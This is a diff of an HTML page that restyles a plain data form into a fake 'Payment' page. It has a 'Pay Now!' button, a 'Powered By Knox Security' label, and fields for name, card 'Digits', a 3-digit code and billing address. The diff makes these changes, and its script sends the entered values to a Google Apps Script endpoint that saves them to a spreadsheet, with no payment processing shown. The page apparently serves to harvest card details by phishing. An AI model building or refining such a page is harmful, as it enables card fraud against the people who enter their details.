@@ -2,23 +2,39 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Form</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#0f172a">
+  <title>Payment</title>
   <style>
     /* ============================================================
-       PAGE BACKGROUND — change these later
+       THEME — change these to restyle the whole page
        ============================================================ */
     :root {
-      --page-bg: #0f172a;               /* solid color */
-      /* --page-bg: url('bg.jpg') center/cover no-repeat; */
-      /* --page-bg: linear-gradient(135deg, #1e3a8a, #0f172a); */
+      /* Background */
+      --page-bg: radial-gradient(1200px 600px at 20% 0%, #1e3a8a 0%, #0f172a 55%, #020617 100%);
+      /* --page-bg: url('cesco.png') center/cover no-repeat; */
+      /* --page-bg: #0f172a; */
 
+      /* Brand */
       --accent: #2563eb;
       --accent-hover: #1d4ed8;
-      --text: #0f172a;
-      --muted: #64748b;
-      --border: #cbd5e1;
+      --accent-glow: rgba(37, 99, 235, .35);
+
+      /* Surfaces */
+      --card-bg: #ffffff;
       --field-bg: #f8fafc;
+      --border: #e2e8f0;
+      --border-strong: #cbd5e1;
+
+      /* Text */
+      --text: #0f172a;
+      --text-soft: #334155;
+      --muted: #64748b;
+
+      /* Radii / motion */
+      --radius-lg: 20px;
+      --radius-md: 12px;
+      --ease-out: cubic-bezier(.22,.9,.3,1);
     }
 
     * { box-sizing: border-box; }
@@ -26,155 +42,288 @@
     html, body {
       margin: 0;
       min-height: 100%;
-      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
       color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
     }
 
     body {
       background: var(--page-bg);
-      min-height: 100vh;
+      min-height: 100dvh;
       display: grid;
       place-items: center;
-      padding: 1rem;
+      padding: max(1rem, env(safe-area-inset-top))
+               max(1rem, env(safe-area-inset-right))
+               max(1rem, env(safe-area-inset-bottom))
+               max(1rem, env(safe-area-inset-left));
+      overflow-x: hidden;
     }
 
     /* ============================================================
        OPEN BUTTON
        ============================================================ */
-    .open-btn {
-      padding: .85rem 1.4rem;
-      border: 0;
-      border-radius: 10px;
-      background: var(--accent);
-      color: #fff;
-      font: 600 1rem/1 system-ui, sans-serif;
-      cursor: pointer;
-      box-shadow: 0 8px 24px rgba(0,0,0,.25);
-      transition: background .15s ease, transform .1s ease;
-    }
-    .open-btn:hover { background: var(--accent-hover); }
-    .open-btn:active { transform: translateY(1px); }
-    .open-btn.hidden { display: none; }
+/* ============================================================
+   OPEN BUTTON
+   ============================================================ */
+/* ============================================================
+   OPEN BUTTON — always high contrast
+   ============================================================ */
+.open-btn {
+  position: relative;
+  padding: 1rem 1.6rem;
+  min-height: 52px;
+  border: 0;
+  border-radius: 999px;               /* pill shape reads as a button */
+  background: #0f172a;                /* near-black, contrasts on light AND dark */
+  color: #ffffff;
+  font: 700 1rem/1 system-ui, sans-serif;
+  letter-spacing: .02em;
+  cursor: pointer;
+  box-shadow:
+    0 0 0 3px rgba(255, 255, 255, .9),   /* white ring: separates from any bg */
+    0 0 0 6px rgba(0, 0, 0, .25),        /* dark halo: separates from light bg */
+    0 14px 30px -10px rgba(0, 0, 0, .6), /* depth */
+    inset 0 1px 0 rgba(255, 255, 255, .15);
+  transition:
+    transform .15s var(--ease-out),
+    box-shadow .2s var(--ease-out),
+    background .2s var(--ease-out);
+  -webkit-tap-highlight-color: transparent;
+}
+.open-btn:hover {
+  background: #1e293b;
+  box-shadow:
+    0 0 0 3px rgba(255, 255, 255, 1),
+    0 0 0 7px rgba(0, 0, 0, .3),
+    0 18px 36px -10px rgba(0, 0, 0, .65),
+    inset 0 1px 0 rgba(255, 255, 255, .2);
+}
+.open-btn:active { transform: scale(.97); }
+.open-btn.hidden { display: none; }
 
     /* ============================================================
-       THANK-YOU BANNER (shown after submit)
+       THANK YOU CARD
        ============================================================ */
     .thanks {
       display: none;
       text-align: center;
       color: #fff;
+      width: 100%;
       max-width: 420px;
-      padding: 2rem 1.5rem;
-      background: rgba(255, 255, 255, .08);
-      border: 1px solid rgba(255, 255, 255, .15);
-      border-radius: 16px;
-      backdrop-filter: blur(6px);
-      box-shadow: 0 20px 60px rgba(0,0,0,.35);
-      animation: fadeUp .35s ease both;
+      padding: 2.25rem 1.75rem;
+      background: rgba(255,255,255,.07);
+      border: 1px solid rgba(255,255,255,.14);
+      border-radius: var(--radius-lg);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      box-shadow: 0 25px 60px -20px rgba(0,0,0,.55);
     }
-    .thanks.show { display: block; }
-    .thanks h2 { margin: 0 0 .4rem; font-size: 1.4rem; }
-    .thanks p  { margin: 0; color: #cbd5e1; }
+    .thanks.show {
+      display: block;
+      animation: thanksIn .5s var(--ease-out) both;
+    }
+    .thanks .icon {
+      font-size: 2.25rem;
+      margin-bottom: .5rem;
+      display: inline-block;
+      animation: pop .6s .1s var(--ease-out) both;
+    }
+    .thanks h2 {
+      margin: 0 0 .4rem;
+      font-size: 1.4rem;
+      letter-spacing: -.01em;
+    }
+    .thanks p {
+      margin: 0;
+      color: #cbd5e1;
+      font-size: .95rem;
+    }
 
-    @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(10px); }
-      to   { opacity: 1; transform: translateY(0); }
+    @keyframes thanksIn {
+      from { opacity: 0; transform: translateY(12px) scale(.98); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    @keyframes pop {
+      0%   { transform: scale(.4); opacity: 0; }
+      60%  { transform: scale(1.15); opacity: 1; }
+      100% { transform: scale(1); }
     }
 
     /* ============================================================
-       MODAL
+       MODAL BACKDROP
        ============================================================ */
     .modal-backdrop {
       position: fixed;
       inset: 0;
-      background: rgba(15, 23, 42, .55);
-      backdrop-filter: blur(6px);
+      background: rgba(2, 6, 23, .65);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
       display: grid;
       place-items: center;
-      padding: 1rem;
+      padding: max(1rem, env(safe-area-inset-top))
+               max(1rem, env(safe-area-inset-right))
+               max(1rem, env(safe-area-inset-bottom))
+               max(1rem, env(safe-area-inset-left));
       opacity: 0;
       visibility: hidden;
-      transition: opacity .2s ease, visibility .2s ease;
+      transition: opacity .25s var(--ease-out), visibility .25s var(--ease-out);
       z-index: 50;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
     }
     .modal-backdrop.open {
       opacity: 1;
       visibility: visible;
     }
 
+    /* ============================================================
+       MODAL CARD
+       ============================================================ */
     .modal {
       width: 100%;
-      max-width: 440px;
-      max-height: 90vh;
+      max-width: 460px;
+      max-height: calc(100dvh - 2rem);
       overflow-y: auto;
-      background: #fff;
-      border-radius: 16px;
-      padding: 1.75rem 1.75rem 2rem;
-      box-shadow: 0 20px 60px rgba(0,0,0,.35);
-      transform: translateY(12px) scale(.98);
-      transition: transform .2s ease;
+      overscroll-behavior: contain;
+      background: var(--card-bg);
+      border-radius: var(--radius-lg);
+      padding: 2rem 1.75rem;
+      box-shadow:
+        0 30px 80px -20px rgba(0,0,0,.55),
+        0 10px 30px -10px rgba(0,0,0,.35);
+      transform: translateY(20px) scale(.96);
+      opacity: 0;
+      transition:
+        transform .35s var(--ease-out),
+        opacity .35s var(--ease-out);
       position: relative;
     }
     .modal-backdrop.open .modal {
       transform: translateY(0) scale(1);
+      opacity: 1;
+    }
+
+    /* Small accent bar at top */
+    .modal::before {
+      content: "";
+      position: absolute;
+      inset: 0 0 auto 0;
+      height: 4px;
+      background: linear-gradient(90deg, #3b82f6, #8b5cf6, #ec4899);
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
     }
 
     .modal h2 {
-      margin: 0 0 .25rem;
-      font-size: 1.35rem;
-      letter-spacing: -.01em;
+      margin: 0 0 .35rem;
+      font-size: 1.45rem;
+      letter-spacing: -.015em;
+      line-height: 1.2;
     }
     .modal p.sub {
-      margin: 0 0 1.25rem;
+      margin: 0 0 1.5rem;
       color: var(--muted);
-      font-size: .9rem;
+      font-size: .92rem;
+      line-height: 1.45;
     }
 
     /* ============================================================
        FORM FIELDS
        ============================================================ */
-    .field { margin-bottom: 1rem; }
+    .field {
+      margin-bottom: 1.1rem;
+      animation: fieldIn .4s var(--ease-out) both;
+    }
+    .field:nth-child(1) { animation-delay: .04s; }
+    .field:nth-child(2) { animation-delay: .08s; }
+    .field:nth-child(3) { animation-delay: .12s; }
+    .field:nth-child(4) { animation-delay: .16s; }
+    .field:nth-child(5) { animation-delay: .20s; }
+    .field:nth-child(6) { animation-delay: .24s; }
+    .field:nth-child(7) { animation-delay: .28s; }
+    .field:nth-child(8) { animation-delay: .32s; }
+
+    @keyframes fieldIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
 
     .field label {
       display: block;
-      font-size: .85rem;
+      font-size: .82rem;
       font-weight: 600;
-      margin-bottom: .35rem;
-      color: #334155;
+      margin-bottom: .4rem;
+      color: var(--text-soft);
+      letter-spacing: .01em;
     }
 
     .field input,
+    .field select,
     .field textarea {
       width: 100%;
-      padding: .7rem .85rem;
-      border: 1px solid var(--border);
-      border-radius: 10px;
+      min-height: 48px;                 /* iOS tap target */
+      padding: .75rem .9rem;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-md);
       background: var(--field-bg);
-      font: inherit;
-      color: inherit;
-      transition: border-color .15s ease, box-shadow .15s ease, background .15s ease;
+      font: 400 16px/1.4 system-ui, sans-serif; /* 16px prevents iOS zoom */
+      color: var(--text);
+      transition:
+        border-color .18s var(--ease-out),
+        box-shadow .18s var(--ease-out),
+        background .18s var(--ease-out);
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .field input::placeholder {
+      color: #94a3b8;
     }
 
     .field input:focus,
+    .field select:focus,
     .field textarea:focus {
       outline: none;
       border-color: var(--accent);
       background: #fff;
-      box-shadow: 0 0 0 3px rgba(37, 99, 235, .18);
+      box-shadow: 0 0 0 4px var(--accent-glow);
     }
 
-    /* Divider before address section */
+    /* Select chevron */
+    .field select {
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+      background-repeat: no-repeat;
+      background-position: right .9rem center;
+      background-size: 14px;
+      padding-right: 2.5rem;
+      cursor: pointer;
+    }
+
+    /* Divider */
     .divider {
+      display: flex;
+      align-items: center;
+      gap: .75rem;
+      margin: 1.5rem 0 1.1rem;
+      color: var(--muted);
+      font-size: .75rem;
+      font-weight: 600;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
       height: 1px;
-      background: #e2e8f0;
-      margin: 1.25rem 0 1rem;
+      background: linear-gradient(90deg, transparent, var(--border), transparent);
     }
 
-    /* Two-column row (state + zip) */
+    /* Two-column row */
     .grid-2 {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: .75rem;
+      gap: .85rem;
     }
 
     /* ============================================================
@@ -182,85 +331,142 @@
        ============================================================ */
     .submit-btn {
       width: 100%;
-      padding: .8rem 1rem;
+      min-height: 52px;
+      padding: .95rem 1rem;
       border: 0;
-      border-radius: 10px;
-      background: var(--accent);
+      border-radius: var(--radius-md);
+      background: linear-gradient(180deg, #3b82f6, var(--accent));
       color: #fff;
       font: 600 1rem/1 system-ui, sans-serif;
+      letter-spacing: .01em;
       cursor: pointer;
-      transition: background .15s ease;
-      margin-top: .25rem;
+      margin-top: .5rem;
+      box-shadow:
+        0 10px 25px -8px var(--accent-glow),
+        0 4px 10px -4px rgba(0,0,0,.3),
+        inset 0 1px 0 rgba(255,255,255,.25);
+      transition:
+        transform .15s var(--ease-out),
+        background .2s var(--ease-out),
+        box-shadow .2s var(--ease-out);
+      -webkit-tap-highlight-color: transparent;
+      position: relative;
+      overflow: hidden;
     }
-    .submit-btn:hover:not(:disabled) { background: var(--accent-hover); }
-    .submit-btn:disabled { background: #94a3b8; cursor: default; }
+    .submit-btn:hover:not(:disabled) {
+      background: linear-gradient(180deg, #60a5fa, var(--accent-hover));
+    }
+    .submit-btn:active:not(:disabled) { transform: scale(.98); }
+    .submit-btn:disabled {
+      background: #94a3b8;
+      cursor: default;
+      box-shadow: none;
+    }
+
+    /* Loading state */
+    .submit-btn.sending::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,.25), transparent);
+      animation: shimmer 1.2s infinite;
+    }
+    @keyframes shimmer {
+      from { transform: translateX(-100%); }
+      to   { transform: translateX(100%); }
+    }
 
     /* ============================================================
        STATUS
        ============================================================ */
     #status {
-      margin-top: .9rem;
+      margin-top: 1rem;
       font-size: .9rem;
-      min-height: 1.2em;
+      min-height: 1.3em;
+      text-align: center;
+      transition: opacity .2s var(--ease-out);
     }
-    #status.ok  { color: #15803d; }
-    #status.err { color: #b91c1c; }
+    #status.ok  { color: #15803d; font-weight: 600; }
+    #status.err { color: #b91c1c; font-weight: 500; }
 
     /* ============================================================
-       CLOSE (X)
+       CLOSE BUTTON
        ============================================================ */
     .close-btn {
       position: absolute;
-      top: .75rem;
-      right: .75rem;
-      width: 32px;
-      height: 32px;
+      top: .85rem;
+      right: .85rem;
+      width: 40px;
+      height: 40px;
       border: 0;
-      border-radius: 8px;
+      border-radius: 10px;
       background: transparent;
       color: var(--muted);
-      font-size: 1.25rem;
+      font-size: 1.15rem;
       line-height: 1;
       cursor: pointer;
-      transition: background .15s ease, color .15s ease;
+      transition: background .18s var(--ease-out), color .18s var(--ease-out), transform .1s var(--ease-out);
+      -webkit-tap-highlight-color: transparent;
     }
     .close-btn:hover { background: #f1f5f9; color: var(--text); }
+    .close-btn:active { transform: scale(.9); }
 
-    /* Stack state/zip on very small screens */
-    @media (max-width: 360px) {
+    /* ============================================================
+       MOBILE TWEAKS
+       ============================================================ */
+    @media (max-width: 420px) {
+      .modal {
+        padding: 1.75rem 1.25rem 1.5rem;
+        border-radius: 18px;
+      }
+      .modal h2 { font-size: 1.3rem; }
       .grid-2 { grid-template-columns: 1fr; gap: 0; }
+    }
+
+    /* On short phones, modal scrolls; backdrop locks scroll */
+    @media (max-height: 640px) {
+      .modal { max-height: calc(100dvh - 1.5rem); }
+    }
+
+    /* Reduced motion */
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: .01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: .01ms !important;
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- Thank-you card (hidden until a successful submit) -->
+  <!-- Thank-you card -->
   <div class="thanks" id="thanks" aria-live="polite">
-    <h2>Thank you! 🎉</h2>
+    <div class="icon">🎉</div>
+    <h2>Thank you!</h2>
     <p>Your info was saved. We’ll be in touch.</p>
   </div>
 
-  <!-- Open button (hidden after success) -->
-  <button class="open-btn" id="openBtn">Open form</button>
+  <!-- Open button -->
+  <button class="open-btn" id="openBtn">Pay Now!</button>
 
   <!-- ============================ MODAL ============================ -->
   <div class="modal-backdrop" id="backdrop" aria-hidden="true">
     <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
       <button class="close-btn" id="closeBtn" aria-label="Close">✕</button>
 
-      <h2 id="modalTitle">Submit your info</h2>
-      <p class="sub">Fill in the fields below and we’ll save it.</p>
+      <h2 id="modalTitle">Fill out your card information</h2>
+      <p class="sub">Powered By Knox Security.</p>
 
-      <form id="form">
-        <!-- Basic info -->
+      <form id="form" novalidate>
         <div class="field">
           <label for="fullName">Full name</label>
-          <input id="fullName" name="fullName" required>
+          <input id="fullName" name="fullName" autocomplete="name" required>
         </div>
 
         <div class="field">
           <label for="digits">Digits</label>
-          <input id="digits" name="digits" inputmode="numeric" pattern="\d*" required>
+          <input id="digits" name="digits" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
         </div>
 
         <div class="field">
@@ -270,52 +476,106 @@
 
         <div class="field">
           <label for="password">Code (3 digits)</label>
-          <input id="password" name="password" type="text" inputmode="numeric" placeholder="e.g. 123">
+          <input id="password" name="password" type="text" inputmode="numeric" placeholder="e.g. 123" autocomplete="off">
         </div>
 
-        <!-- Address section -->
-        <div class="divider"></div>
+        <div class="divider">Address</div>
 
         <div class="field">
           <label for="street">Street</label>
-          <input id="street" name="street" required>
+          <input id="street" name="street" autocomplete="address-line1" required>
         </div>
 
         <div class="field">
           <label for="city">City</label>
-          <input id="city" name="city" required>
+          <input id="city" name="city" autocomplete="address-level2" required>
         </div>
 
         <div class="grid-2">
           <div class="field">
             <label for="state">State</label>
-            <input id="state" name="state" required>
+            <select id="state" name="state" autocomplete="address-level1" required>
+              <option value="" disabled selected>Select a state…</option>
+              <option value="AL">Alabama</option>
+              <option value="AK">Alaska</option>
+              <option value="AZ">Arizona</option>
+              <option value="AR">Arkansas</option>
+              <option value="CA">California</option>
+              <option value="CO">Colorado</option>
+              <option value="CT">Connecticut</option>
+              <option value="DE">Delaware</option>
+              <option value="DC">District of Columbia</option>
+              <option value="FL">Florida</option>
+              <option value="GA">Georgia</option>
+              <option value="HI">Hawaii</option>
+              <option value="ID">Idaho</option>
+              <option value="IL">Illinois</option>
+              <option value="IN">Indiana</option>
+              <option value="IA">Iowa</option>
+              <option value="KS">Kansas</option>
+              <option value="KY">Kentucky</option>
+              <option value="LA">Louisiana</option>
+              <option value="ME">Maine</option>
+              <option value="MD">Maryland</option>
+              <option value="MA">Massachusetts</option>
+              <option value="MI">Michigan</option>
+              <option value="MN">Minnesota</option>
+              <option value="MS">Mississippi</option>
+              <option value="MO">Missouri</option>
+              <option value="MT">Montana</option>
+              <option value="NE">Nebraska</option>
+              <option value="NV">Nevada</option>
+              <option value="NH">New Hampshire</option>
+              <option value="NJ">New Jersey</option>
+              <option value="NM">New Mexico</option>
+              <option value="NY">New York</option>
+              <option value="NC">North Carolina</option>
+              <option value="ND">North Dakota</option>
+              <option value="OH">Ohio</option>
+              <option value="OK">Oklahoma</option>
+              <option value="OR">Oregon</option>
+              <option value="PA">Pennsylvania</option>
+              <option value="PR">Puerto Rico</option>
+              <option value="RI">Rhode Island</option>
+              <option value="SC">South Carolina</option>
+              <option value="SD">South Dakota</option>
+              <option value="TN">Tennessee</option>
+              <option value="TX">Texas</option>
+              <option value="UT">Utah</option>
+              <option value="VT">Vermont</option>
+              <option value="VA">Virginia</option>
+              <option value="WA">Washington</option>
+              <option value="WV">West Virginia</option>
+              <option value="WI">Wisconsin</option>
+              <option value="WY">Wyoming</option>
+            </select>
           </div>
           <div class="field">
             <label for="zip">Zip code</label>
-            <input id="zip" name="zip" inputmode="numeric" pattern="\d*" required>
+            <input id="zip" name="zip" inputmode="numeric" autocomplete="postal-code" required>
           </div>
         </div>
 
-        <button type="submit" class="submit-btn">Send</button>
-        <div id="status"></div>
+        <button type="submit" class="submit-btn" id="submitBtn">Send</button>
+        <div id="status" role="status" aria-live="polite"></div>
       </form>
     </div>
   </div>
 
   <script>
     // ============================================================
-    // CONFIG — paste your real Apps Script /exec URL here
+    // CONFIG — real Apps Script /exec URL
     // ============================================================
-    const ENDPOINT = "https://script.google.com/macros/s/AKfycbyavwLitN1DTEYrvTIq_BcNGC0YxKXx0cI5TCFoupKnbN5AVyw31LBTfw0tKbbjbKAZ/exec";
+    const ENDPOINT = "https://script.google.com/macros/s/YOUR_REAL_ID/exec";
 
     const backdrop = document.getElementById("backdrop");
     const openBtn  = document.getElementById("openBtn");
     const closeBtn = document.getElementById("closeBtn");
     const form     = document.getElementById("form");
     const status   = document.getElementById("status");
-    const submit   = form.querySelector("button[type=submit]");
+    const submit   = document.getElementById("submitBtn");
     const thanks   = document.getElementById("thanks");
+    const firstInput = document.getElementById("fullName");
 
     // ============================================================
     // OPEN / CLOSE
@@ -324,12 +584,18 @@
       backdrop.classList.add("open");
       backdrop.setAttribute("aria-hidden", "false");
       document.body.style.overflow = "hidden";
-      setTimeout(() => document.getElementById("fullName").focus(), 50);
+      // Focus first field on desktop; on mobile, delay to avoid
+      // auto-opening the keyboard which can hide the modal header
+      if (window.matchMedia("(pointer: fine)").matches) {
+        setTimeout(() => firstInput.focus(), 120);
+      }
     }
     function closeModal() {
       backdrop.classList.remove("open");
       backdrop.setAttribute("aria-hidden", "true");
       document.body.style.overflow = "";
+      // return focus to trigger for accessibility
+      if (!openBtn.classList.contains("hidden")) openBtn.focus();
     }
 
     openBtn.addEventListener("click", openModal);
@@ -348,13 +614,20 @@
     // ============================================================
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
+
+      // Simple required-field check (novalidate + custom flow)
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
       submit.disabled = true;
+      submit.classList.add("sending");
       status.className = "";
       status.textContent = "Sending...";
 
       const raw = Object.fromEntries(new FormData(form));
 
-      // Combine street / city / state / zip into ONE address string
       const address = [
         raw.street?.trim(),
         raw.city?.trim(),
@@ -362,7 +635,6 @@
         raw.zip?.trim()
       ].filter(Boolean).join(", ");
 
-      // Payload matches the sheet columns
       const data = {
         fullName: raw.fullName || "",
         digits:   raw.digits   || "",
@@ -384,17 +656,19 @@
         status.textContent = "✅ Saved!";
         form.reset();
 
-        // Close modal, then show the thank-you card
         setTimeout(() => {
           closeModal();
           thanks.classList.add("show");
           openBtn.classList.add("hidden");
+          status.textContent = "";
+          status.className = "";
         }, 900);
       } catch (err) {
         status.className = "err";
         status.textContent = "❌ " + err.message;
       } finally {
         submit.disabled = false;
+        submit.classList.remove("sending");
       }
     });
   </script>
